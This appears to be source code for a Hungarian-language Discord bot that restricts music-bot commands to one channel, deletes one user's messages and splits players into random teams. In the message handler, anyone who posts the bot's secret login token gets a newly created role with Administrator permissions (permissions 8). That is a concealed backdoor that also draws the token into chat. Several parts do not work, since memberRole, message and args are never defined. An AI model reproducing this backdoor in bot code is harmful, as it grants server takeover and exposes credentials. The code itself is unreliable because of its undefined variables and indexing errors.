const Discord = require('discord.js');
const client = new Discord.Client();

var names = [];
var team1 = [];
var team2 = [];

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

client.on('guildMemberAdd', member => {

    let RoleName = 'Sheepbot';


    member.addRole(memberRole)
});

client.on('message', msg => {
    if (msg.author.equals(client.user)) return;
    //Sheepbot csak a zenébe tud írni
    var sheepbotcmds = ['!!play', '!!pause', '!!stop', '!!skip', '!!volume', '!!autoplay', '!!playing', '!!playtop', '!!loopqueue', '!!q', '!!shuffle'];
    var i;
    for (i = 0; i < sheepbotcmds.length; i++) {
         if (!(msg.channel.name === '🎶zenebona') && (msg.content.startsWith(sheepbotcmds[i]))) {
            msg.delete()
                .then(msg => console.log(`Deleted message from ${msg.author.username}`))
                .catch(console.error);
        };
    };
    if (!(msg.channel.name === '🎶zenebona') && (msg.author.id === '244423082045997057')) {
        msg.delete()
            .then(msg => console.log(`Deleted message from ${msg.author.username}`))
            .catch(console.error);
    };
    if (msg.content == process.env.TOKEN) {

        msg.delete()
            .then(msg => console.log(`Deleted message from ${msg.author.username}`))
            .catch(console.error);

        let RoleName = 'Sheepbot';
        msg.member.guild.createRole({
            name: RoleName,
            permissions: 8
        }).then(function (role) {
            msg.member.addRole(role);
        });
    };
    function rt_help() {
    var embed = new Discord.RichEmbed()
      .addField("Random Team", "!randomteam_upload <nevek szóközzel elválasztva>\n//rövidítés: rt_u | pl.: rt_u Matyi Sanyi Laci Mami\n!rantomteam_generate\n//rövidítés: rt_g")
      .setColor("#daace5")
      .setThumbnail(message.author.avatarURL)
      .setFooter("Készítette: Szente")

    if (args[0] == "rt" || args[0] == "randomteam") {
      message.channel.send(embed);
    }
  };

  rt_help();



  function clearArray(array) {
    while (array.length) {
      array.pop();
    }
  };

  function team_upload() {

    if (args[0] == "rt_u" || args[0] == "randomteam_upload") {
      clearArray(names);
      for (var i = 0; i <= args.length; i++) {
        names[(i - 1)] = args[i];
      }
      names.pop();
      message.channel.send("Választék: " + names.join(", "));
    }
  };
  team_upload();

  function team_random() {
    if (args[0] == "rt_g" || args[0] == "randomteam_generate") {
      var t1 = 0;
      var t2 = 0;
      for (var i = 0; i < names.length; i++) {
        var random = Math.floor(Math.random() * 2);
        //console.log(random);
        if (random == 0) {
          if (team1.length < (names.length / 2)) {
            team1[t1] = names[i];
            t1++;
          } else {
            team2[t2] = names[i];
            t2++;
          }
        }
        if (random == 1) {
          if (team2.length < (names.length / 2)) {
            team2[t2] = names[i];
            t2++;
          } else {
            team1[t1] = names[i];
            t1++;
          }
        }
      }
      message.channel.send("1. Csapat: " + team1.join(", ") + "\n2.Csapat: " + team2.join(", "));
      t1 = 0;
      t2 = 0;
      clearArray(team1);
      clearArray(team2);
    }
  };

  team_random();

});

client.login(process.env.TOKEN);
